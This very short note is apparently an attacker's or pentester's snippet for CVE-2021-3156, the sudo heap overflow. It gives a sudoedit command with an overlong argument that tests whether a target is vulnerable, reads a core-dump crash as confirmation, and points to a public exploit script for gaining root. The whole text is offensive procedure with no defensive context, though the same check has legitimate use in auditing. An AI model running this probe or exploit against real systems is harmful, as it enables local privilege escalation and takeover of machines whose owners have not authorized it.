sudoedit -s '\' $(python3 -c 'print("A"*1000)')

#If console crash 'Aborted (core dumped)', then the target is vulnerable. We can trigger the exploit through the following code: https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py
